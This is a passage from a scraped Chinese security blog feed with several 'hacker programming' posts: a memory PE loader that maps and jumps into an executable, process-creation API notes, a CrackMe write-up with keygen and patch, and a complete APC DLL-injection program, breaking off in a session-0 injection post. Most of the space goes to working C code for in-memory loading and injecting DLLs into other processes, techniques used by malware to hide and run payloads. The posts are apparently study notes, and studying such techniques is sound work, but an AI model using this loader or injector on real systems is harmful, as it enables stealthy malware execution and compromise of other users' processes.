根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。 12LPVOID lpBaseAddr = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);RtlZeroMemory(lpBaseAddr, dwImageSize); 加载1234567891011121314151617181920212223242526272829/*将PE文件的头部和节区加载到内存中*/BOOL LoadSection(LPVOID lpData, LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取DOS头+NT头+节表的总大小 DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders; //获取节的数量 int NumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections; //获取第一个节表头的地址，通过NT头加上NT头大小就是第一个节头 PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS)); //加载DOS头+NT头+节表 RtlCopyMemory(lpBaseAddr, lpData, dwSizeOfHeaders); LPVOID lpSrc = NULL; LPVOID lpDest = NULL; DWORD dwSizeOfRawData = 0; for (int i = 0; i &lt; NumberOfSections; i++) &#123; if ((pSectionHeader-&gt;VirtualAddress == 0) || (pSectionHeader-&gt;SizeOfRawData == 0)) &#123; pSectionHeader++; continue; &#125; lpSrc = (LPVOID)((DWORD)lpData + pSectionHeader-&gt;PointerToRawData); lpDest = (LPVOID)((DWORD)lpBaseAddr + pSectionHeader-&gt;VirtualAddress); dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData; RtlCopyMemory(lpDest, lpSrc, dwSizeOfRawData); pSectionHeader++; &#125; return TRUE;&#125; 重定位数据12345678910111213141516171819202122232425262728293031323334/*获取重定位表的相关数据并且重定位数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoRelocationTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取重定位表 PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((unsigned long)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); if ((PVOID)pReloc == (PVOID)pDosHeader) &#123; return TRUE; &#125; //开始扫描重定位表 while ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != 0) &#123; //重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始 WORD* pRelocData = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //获取需要重定位的数据的个数 int nNumberOfReloc = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (int i = 0; i &lt; nNumberOfReloc; i++) &#123; //高位是否为3，判断是否需要修复 if ((DWORD)(pRelocData[i] &amp; 0x0000F000) == 0x00003000) &#123; //获取需要重定位数据的地址 DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; 0x0FFF)); //修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值 DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; //继续处理下一组重定位数据 pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 导入表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/*获取导入表的相关数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoImportTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导入表地址 PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // 循环遍历导入表中的DLL及获取导入表中的函数地址 char* lpDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; DWORD i = 0; while (TRUE) &#123; if (0 == pImportTable-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中DLL的名称并加载DLL lpDllName = (char*)((DWORD)pDosHeader + pImportTable-&gt;Name); hDll = GetModuleHandleA(lpDllName); if (NULL == hDll) &#123; hDll = LoadLibraryA(lpDllName); if (NULL == hDll) &#123; pImportTable++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk); // 获取FirstThunk以及对应的导入函数地址表首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk); while (TRUE) &#123; if (0 == lpImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if (0x80000000 &amp; lpImportNameArray[i].u1.Ordinal) &#123; // 序号导出 // 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name); &#125; lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress; i++; &#125; pImportTable++; &#125; return TRUE;&#125; 修改ImageBase1234567//修改ImageBaseBOOL SetImage(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr; return TRUE;&#125; 获取入口点如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。 123456789BOOL Entry(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); __asm &#123; mov eax,Entry jmp eax &#125;&#125; 现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下： 12345#include &lt;stdio.h&gt;int main()&#123; printf(&quot;b1ackie!!!\\n&quot;); return 0;&#125; 运行程序查看效果，可以看到直接加载运行TestProcess.exe。 若是DLL文件，还需要构造一下DLLMAIN 123456789101112BOOL CallDllMain(LPVOID lpBaseAddr) &#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); BOOL bRet = DllMain((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,NULL); if (bRet == NULL) &#123; printf(&quot;构造入口点失败\\n&quot;); return bRet; &#125; return bRet;&#125; 导出表123456789101112131415161718192021222324252627282930313233343536/*获取导出函数及其地址* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址* lpszFuncName：导出函数名字*/LPVOID GetExFuncAddr(LPVOID lpBaseAddr,char* lpszFuncName) &#123; LPVOID lpFunc = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导出表地址 PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); //从导出表取出的函数名 char* lpFuncName = NULL; //获取AddressOfNames PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames); //获取AddressOfNameOrdinals PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals); //索引值 WORD wHint = 0; //获取AddressOfFunctions PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions); //获取所有根据名称导出的函数数量 DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames; for (int i = 0; i &lt; dwNumberOfNames; i++) &#123; lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (strcmpi(lpFuncName, lpszFuncName) == 0) &#123; //获取索引值 wHint = lpAddressOfNameOrdinalArray[i]; //根据索引值，在AddressOfFunctions中取出RVA lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; //返回函数地址 return lpFunc;&#125; 运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ackie.cn/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ackie.cn/tags/PE/"}]},{"title":"启动技术-创建进程API","slug":"启动技术-创建进程API","date":"2021-07-14T07:15:24.000Z","updated":"2021-08-30T06:18:01.960Z","comments":true,"path":"2021/07/14/启动技术-创建进程API/","link":"","permalink":"https://b1ackie.cn/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/","excerpt":"","text":"创建进程API在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。 具体实现及函数介绍WinExec运行指定的应用程序 1234UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow); lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件： 应用程序加载的目录 当前目录 Windows系统目录。GetSystemDirectory函数检索此目录的路径。 Windows目录。GetWindowsDirectory函数检索此目录的路径。 PATH环节变量中列出的目录 uCmdShow：显示选项，具体内容如下表： 值 含义 SW_HIDE0 隐藏窗口并激活另一个窗口 SW_SHOWNORMALSW_NORMAL1 激活并显示一个窗口 SW_SHOWMINIMIZED2 激活窗口并将其显示为最小化的窗口 SW_SHOWMAXIMIZEDSW_MAXIMIZE3 激活窗口并将其显示为最大化窗口 SW_SHOWNOACTIVATE4 以最近的大小和位置显示窗口 SW_SHOW5 激活窗口并以其当前大小和位置显示它 SW_MINIMIZE6 最小化指定的窗口并激活Z顺序中的下一个顶级窗口 SW_SHOWMINNOACTIVE7 将窗口显示为最小化窗口 SW_SHOWNA8 以当前大小和位置显示窗口 SW_RESTORE9 激活并显示窗口 SW_SHOWDEFAULT10 根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。 SW_FORCEMINIMIZE11 最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。 返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。 值 含义 0 系统内存或资源不足 ERROR_BAD_FORMAT exe文件无效 ERROR_FILE_NOT_FOUND 找不到指定文件 ERROR_PATH_NOT_FOUND 找不到指定的路径 具体代码如下： 12345678910BOOL Open(char* szPath, UINT uiCmdshow)&#123; UINT uiRet = 0; uiRet = WinExec(szPath, uiCmdshow); if (uiRet &gt; 31) &#123; return TRUE; &#125; return FALSE;&#125; 创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。 ShellExecute函数对指定文件执行操作 12345678HINSTANCE ShellExecuteA( HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd); hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。 lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有： edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。 explore：探索由lpFile指定的文件夹。 find：在由lpDirectory指定的目录中启动搜索。 open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。 print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。 NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。 lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。 lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。 lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。 nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。 返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;自己的文件路径&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 运行程序提示创建成功，同时TestAPC被成功创建。 CreateProcess创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。 123456789101112BOOL CreateProcess( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。 lpCommandLine：要执行的命令行。 lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果lpProcessAttributes为NULL，则不能继承句柄。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果lpThreadAttributes为 NULL，则不能继承句柄。 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程创建的标志。 lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。 lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。 lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。 返回值：如果函数成功，则返回值非0；若失败，则返回值为0。 具体代码如下： 12345678910111213STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFORMATION pi;si.cb = sizeof(si);si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = SW_NORMAL;BOOL flag = CreateProcess(NULL, &quot;自己的文件路径&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);if (flag) &#123; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); printf(&quot;CreateProcess创建成功\\n&quot;);&#125;else printf(&quot;CreateProcess创建失败\\n&quot;); 运行之后，即可成功创建TestAPC进程。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ackie.cn/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-001","slug":"160CrackMe-001","date":"2021-07-14T02:23:13.000Z","updated":"2021-08-09T10:55:30.407Z","comments":true,"path":"2021/07/14/160CrackMe-001/","link":"","permalink":"https://b1ackie.cn/2021/07/14/160CrackMe-001/","excerpt":"","text":"初探打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。 程序主题界面有两部分，第一部分是序列号加名字。 第二部分是单纯的序列号，应该是比较简单。 看完大体流程，开始分析。 分析查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。 先分析单纯的序列号。用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。 在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。 那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。 再来分析序列号加用户名还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。 首先是检测了输入的用户名长度，不可以小于4位。 继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。 数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。 到这里整个过程就分析了，开始尝试编写注册机 注册机编写12345678910111213141516171819#include &quot;pch.h&quot;#include &lt; stdio.h &gt;#include &lt;string.h&gt;#include &lt;corecrt_malloc.h&gt;int main()&#123; char Name[20]; printf(&quot;请输入大于四位的用户名\\n&quot;); gets_s(Name, 20); int Num; Num = (Name[0] * 0x29) * 2; char* s1=&quot;CW&quot;; char* s2 = &quot;CRACKED&quot;; char* s3= &quot;-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%s%d%s%s&quot;, s1, s3, Num, s3, s2); printf(&quot;用户名是：%s\\nserial是：%s&quot;, Name, serial); return 0;&#125; 输入用户名b1ackie，就可以计算出正确的serial。 输入正确的值查看 弹窗的消除先根据弹窗的提示信息，搜索字符串，可以定位到此处。 执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。 小结第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。 还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"注入技术-APC注入","slug":"注入技术-APC注入","date":"2021-07-13T07:25:36.000Z","updated":"2021-08-09T10:53:14.446Z","comments":true,"path":"2021/07/13/注入技术-APC注入/","link":"","permalink":"https://b1ackie.cn/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/","excerpt":"","text":"APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD QueueUserAPC( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData); pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。 hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。 dwData：传递由pfnAPC参数指向的APC函数的单个值。 返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。 具体实现在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。 具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;DWORD GetPidByName(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 PE32 = &#123; sizeof(PE32) &#125;; USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;PE32); while (flag) &#123; if (lstrcmp(PE32.szExeFile, ProcessName) == 0) &#123; return PE32.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;PE32); &#125; return 0;&#125;BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)&#123; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBufferLength = 1000; THREADENTRY32 te32 = &#123; 0 &#125;; HANDLE hSnapshot = NULL; BOOL bRet = TRUE; do &#123; // 申请内存 pThreadId = new DWORD[dwBufferLength]; if (NULL == pThreadId) &#123; printf(&quot;申请内存失败\\n&quot;); bRet = FALSE; break; &#125; RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD))); // 获取线程快照 RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (NULL == hSnapshot) &#123; bRet = FALSE; break; &#125; // 获取第一条线程快照信息 bRet = Thread32First(hSnapshot, &amp;te32); while (bRet) &#123; // 获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) &#123; pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; &#125; // 遍历下一个线程快照信息 bRet = Thread32Next(hSnapshot, &amp;te32); &#125; // 返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; &#125; while (FALSE); if (FALSE == bRet) &#123; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; &#125; return bRet;&#125;BOOL Inject(char* pszProcessName, char* pszDllname) &#123; BOOL flag = FALSE; DWORD dwPID = 0; DWORD* pThreadId = NULL; DWORD dwThreadLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryFunc = NULL; SIZE_T dwRet = 0, dwDllPathLen = strlen(pszDllname) + 1; DWORD i = 0; do &#123; //获取进程的PID dwPID = GetPidByName(pszProcessName); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); flag = FALSE; break; &#125; //获取所有线程ID flag = GetAllThreadIdByProcessId(dwPID, &amp;pThreadId, &amp;dwThreadLength); if (flag == FALSE) &#123; flag = FALSE; break; &#125; //打开进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); flag = FALSE; break; &#125; //申请内存空间 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) &#123; printf(&quot;申请空间失败\\n&quot;); flag = FALSE; break; &#125; //向申请的空间写入内存 WriteProcessMemory(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet); if (dwRet != dwDllPathLen) &#123; printf(&quot;写入内存失败\\n&quot;); flag = FALSE; break; &#125; pLoadLibraryFunc = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); flag = FALSE; break; &#125; //向所有的线程插入APC函数 for (i = 0; i &lt; dwThreadLength; i++) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; flag = TRUE; &#125; while (FALSE); if (hProcess) &#123; CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; return flag;&#125;int main()&#123; BOOL flag=Inject(&quot;自己的文件路径&quot;); if (flag == TRUE) &#123; printf(&quot;注入成功\\n&quot;); &#125; else printf(&quot;失败\\n&quot;); getchar(); return 0;&#125; 效果查看写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。 123456void CTestApcDlg::OnBnClickedOk()&#123; // TODO: 在此添加控件通知处理程序代码 SleepEx(10000, true); //CDialogEx::OnOK();&#125; 然后打开我们的注入程序，看到提示已经注入成功。 点击确定按钮，就会弹出我们在DLL里写好的弹窗。 使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ackie.cn/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-突破session 0隔离的远线程注入","slug":"注入技术-突破session 0隔离的远线程注入","date":"2021-07-13T02:02:17.000Z","updated":"2021-08-09T10:53:08.392Z","comments":true,"path":"2021/07/13/注入技术-突破session 0隔离的远线程注入/","link":"","permalink":"https://b1ackie.cn/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SESSION 0隔离在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 